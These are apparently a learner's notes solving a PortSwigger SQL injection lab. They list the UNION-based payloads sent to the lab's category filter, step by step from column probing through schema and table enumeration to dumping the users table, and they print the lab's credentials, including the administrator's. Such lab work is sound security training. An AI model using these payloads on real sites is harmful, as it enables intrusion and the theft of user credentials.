```
https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

https://0a0a008e0345a7598137a8df00400014.web-security-academy.net/filter?category=Gifts'  --> internal error
https://0a0a008e0345a7598137a8df00400014.web-security-academy.net/filter?category=' or 1 = 1 -- --> run success

https://0a0a008e0345a7598137a8df00400014.web-security-academy.net/filter?category=' UNION SELECT NULL -- abc --> internal error
https://0a0a008e0345a7598137a8df00400014.web-security-academy.net/filter?category=' UNION SELECT NULL, NULL -- abc --> OK

https://0a0a008e0345a7598137a8df00400014.web-security-academy.net/filter?category=' UNION SELECT 'a', NULL -- abc --> internel error
https://0a0a008e0345a7598137a8df00400014.web-security-academy.net/filter?category=' UNION SELECT NULL, 'a' -- abc --> OK
```
```
https://0a0a008e0345a7598137a8df00400014.web-security-academy.net/filter?category=' UNION SELECT NULL, schema_name FROM information_schema.schemata -- abc
```

```
information_schema
public
pg_catalog
```
```
https://0a0a008e0345a7598137a8df00400014.web-security-academy.net/filter?category=' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'public' -- abc
```

```
users
products
```
```
https://0a0a008e0345a7598137a8df00400014.web-security-academy.net/filter?category=' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_schema = 'public' and table_name = 'users' -- abc
```
```
password
username
```
```
https://0a0a008e0345a7598137a8df00400014.web-security-academy.net/filter?category=' UNION SELECT NULL, CONCAT(username, ' ', password) FROM public.users -- abc
```

```
carlos v9g6h6tuc65rn1v5aq3g
wiener g6ijo4u6f9frfn26wp60
administrator xi8r6tb6ecsomtxntqzd
```
